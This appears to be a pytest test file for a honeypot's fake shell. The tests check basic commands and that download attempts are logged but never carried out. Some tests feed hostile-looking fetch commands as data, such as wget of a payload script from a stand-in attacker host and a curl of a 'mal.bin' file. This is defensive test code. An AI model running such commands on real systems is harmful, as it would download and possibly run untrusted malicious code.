import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.filesystem import FakeFilesystem
from src.shell import FakeShell
from src.malware_capture import MalwareCaptureLogger, parse_fetch_command

FAKE_USERS = [{"username": "root", "uid": 0, "gid": 0, "home": "/root", "shell": "/bin/bash"}]


def make_shell(tmp_path):
    fs = FakeFilesystem(hostname="test-host", distro="Ubuntu 22.04.4 LTS",
                         kernel="5.15.0-105-generic", fake_users=FAKE_USERS)
    logger = MalwareCaptureLogger(str(tmp_path / "capture.jsonl"))
    return FakeShell(username="root", hostname="test-host", fs=fs, home_dir="/root",
                      malware_logger=logger, session_id="abc123", src_ip="203.0.113.4")


def test_pwd_and_cd(tmp_path):
    shell = make_shell(tmp_path)
    out, ok, _ = shell.execute("pwd")
    assert out == "/root" and ok
    shell.execute("cd /tmp")
    out, ok, _ = shell.execute("pwd")
    assert out == "/tmp"


def test_whoami_and_id(tmp_path):
    shell = make_shell(tmp_path)
    out, ok, _ = shell.execute("whoami")
    assert out == "root"
    out, ok, _ = shell.execute("id")
    assert "uid=0(root)" in out


def test_unknown_command(tmp_path):
    shell = make_shell(tmp_path)
    out, ok, _ = shell.execute("frobnicate --now")
    assert not ok
    assert "command not found" in out


def test_mkdir_touch_ls_persist_in_session(tmp_path):
    shell = make_shell(tmp_path)
    shell.execute("mkdir /tmp/loot")
    shell.execute("touch /tmp/loot/data.txt")
    out, ok, _ = shell.execute("ls /tmp/loot")
    assert "data.txt" in out


def test_exit_returns_exit_reason(tmp_path):
    shell = make_shell(tmp_path)
    out, ok, exit_reason = shell.execute("exit")
    assert exit_reason == "user exited shell"


def test_wget_never_downloads_but_is_logged(tmp_path):
    shell = make_shell(tmp_path)
    captured = {}

    def capture_hook(cmd):
        captured["cmd"] = cmd
    shell.on_malware_capture = capture_hook

    out, ok, _ = shell.execute("wget http://evil.example/payload.sh")
    assert not ok  # simulated DNS failure, never a real success
    assert captured["cmd"] == "wget http://evil.example/payload.sh"


def test_parse_fetch_command_extracts_url_and_filename():
    parsed = parse_fetch_command("curl -o out.bin http://example.com/x/mal.bin")
    assert parsed["tool"] == "curl"
    assert parsed["url"] == "http://example.com/x/mal.bin"
    assert parsed["filename"] == "out.bin"


def test_echo_redirect_writes_file(tmp_path):
    shell = make_shell(tmp_path)
    shell.execute("echo hello > /tmp/greeting.txt")
    out, ok, _ = shell.execute("cat /tmp/greeting.txt")
    assert out == "hello"
